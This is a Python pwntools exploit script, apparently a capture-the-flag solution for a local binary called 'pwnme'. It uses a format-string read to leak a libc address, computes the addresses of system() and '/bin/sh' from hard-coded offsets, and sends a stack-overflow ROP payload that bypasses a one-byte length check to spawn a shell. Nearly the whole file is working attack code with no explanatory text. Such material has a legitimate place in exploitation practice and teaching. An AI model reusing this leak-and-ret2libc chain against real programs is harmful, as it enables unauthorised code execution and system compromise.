#!/usr/bin/python
from pwn import *
#context.log_level = 'debug'
p = process('pwnme')

p.recvuntil('(max lenth:40): \n')
p.sendline('%37$p')
p.recvuntil('(max lenth:40): \n')
p.sendline('SeCret')
p.recvuntil('>')

# leak addr of __lib_start_main_ret
p.sendline('1')
__lib_start_main_ret = int(p.recv(14)[2:],16)

# from libc database (./find __lib_start_main_ret f45)
offset___libc_start_main_ret = 0x21f45
offset_system = 0x0000000000046590
offset_dup2 = 0x00000000000ebe90
offset_read = 0x00000000000eb6a0
offset_write = 0x00000000000eb700
offset_str_bin_sh = 0x17c8c3

system_addr = __lib_start_main_ret - offset___libc_start_main_ret + offset_system
log.debug("system addr = " + hex(system_addr))

binsh = __lib_start_main_ret - offset___libc_start_main_ret + offset_str_bin_sh
log.debug("binsh addr = " + hex(binsh))

p.recvuntil('>')
p.sendline('2')
p.recvuntil('(max lenth:20): \n')
p.sendline("username_lalala")
p.recvuntil('(max lenth:20): \n')
# stack overflow 
# al = len(payload) && 0xff
# al != 0 and al <= 0x14

poprdi   = 0x0400ed3
# leak read addr in libc
payload = (
        "A" * 40,
        p64(poprdi),
        p64(binsh),
        p64(system_addr),
    )
payload = ''.join(payload).ljust(0x112,"B")

p.sendline(payload)
p.interactive()